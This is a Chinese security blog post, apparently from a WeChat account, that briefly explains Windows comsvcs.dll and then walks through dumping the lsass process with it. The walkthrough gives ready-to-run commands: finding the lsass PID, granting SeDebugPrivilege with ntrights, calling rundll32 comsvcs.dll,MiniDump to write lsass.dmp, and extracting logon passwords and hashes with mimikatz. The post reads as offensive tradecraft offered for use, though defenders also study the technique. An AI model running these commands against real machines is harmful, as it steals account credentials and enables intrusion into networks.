#  利用Comsvcs.dll 获取转储文件

原创 Beret-SEC  [ 贝雷帽SEC ](javascript:void\(0\);)

**贝雷帽SEC** ![]()

微信号 Beret-Sec

功能介绍 网络安全爱好者，记录、分享网络安全方面的相关知识~

____

___发表于_

  
![]()

**Tips +1  
**

![]()

  

##  关于Comsvcs.dll

 **comsvcs.dll** 是 Windows 操作系统中的一个动态链接库（DLL），负责提供 Component Services
的核心功能。这个组件服务是一个用于构建分布式、可重用组件的系统，其中使用了 Component Object
Model（COM）和事务处理。让我们用更简单易懂的语言解释：

  1.  **组件服务：** 就像建造一座大楼需要不同的组件（如砖块、钢筋、窗户等），在软件开发中，我们也需要构建不同的模块和功能。组件服务就是 Windows 提供的一种方式，让程序员更容易地创建、管理和使用这些软件组件。

  2.  **COM+ 组件模型：** COM+ 是一种软件设计模型，它允许程序员创建独立、可重用的软件组件。这些组件可以像积木一样组合在一起，构建复杂的应用程序。

  3.  **事务处理：** 假设你在网上购物，购物车中有多个商品，你希望一次性完成所有交易。COM+ 提供的事务处理功能就像是一个购物车，确保多个操作要么一起成功，要么一起失败，防止因为某个操作失败而导致数据不一致。

  4.  **Dynamic Link Library (DLL)：** **comsvcs.dll** 是一个动态链接库，其中包含了许多函数和功能，这些函数可以在程序运行时被其他程序调用。简单来说，它是一个共享的软件组件，可以被多个程序共用。

总体来说， **comsvcs.dll** 在 Windows
中扮演着一个重要的角色，它使得开发者更容易构建复杂的、可靠的应用程序，特别是涉及到分布式和事务性的场景。

## 利用过程

通过上面我们简单的了解的comsvcs.dll
的作用，comsvcs.dll作为Windows自带的DLL文件，它包含了一个名为MiniDump的函数，而该函数底层调用了MiniDumpWriteDump接口，我们可以利用该函数创建指定进程的转储文件。

![]()

  *  **hProcess** : 要生成 Minidump 的进程句柄。

  *  **ProcessId** : 进程的 ID。

  *  **hFile** : 要写入的 Minidump 文件的句柄。

  *  **DumpType** : Minidump 的类型，如完全、仅内存、仅模块信息等。

  *  **ExceptionParam** : 异常信息。

  *  **UserStreamParam** : 用户定义的数据流信息。

  *  **CallbackParam** : 回调函数的信息。

1、获取lsass 进程PID

    
    
    tasklist | findstr /i lsass

![]()

2、开启SeDebugPrivilege特权

利用comsvcs.dll 导出转储文件， 还需要开启 SeDebugPrivilege权限，但是 cmd
本身是禁用SeDebugPrivilege特权的。我们可以直接使用powershell进行操作，因为powerhsell默认是启用。

![]()

当然我们可以尝试通过 **ntrights.exe** 工具开启特权（开启后需要重新启动才生效）

执行以下命令以授予 **SeDebugPrivilege** 权限：

    
    
    ntrights +r SeDebugPrivilege -u <Your-Username>  
    # <Your-Username> 替换为你的用户名。

如果你想将权限授予给当前登录的用户，可以使用 **%USERNAME%** 变量，如下所示：

    
    
    ntrights +r SeDebugPrivilege -u %USERNAME%

3、获取转储文件

    
    
    powershell rundll32.exe comsvcs.dll,MiniDump 708 C:\Windows\Temp\lsass.dmp full

![]()

4、使用mimikatz 获取hash

    
    
    mimikatz.exe "sekurlsa::minidump lsass.DMP" "sekurlsa::logonPasswords" exit

![]()

![]()

  

![]()

![]()

  

                                        

End

  

“点赞、在看与分享都是莫大的支持”  

  

  

![]()

  

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# 利用Comsvcs.dll 获取转储文件

原创 Beret-SEC  [ 贝雷帽SEC ](javascript:void\(0\);)

轻触阅读原文

![]()

贝雷帽SEC

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

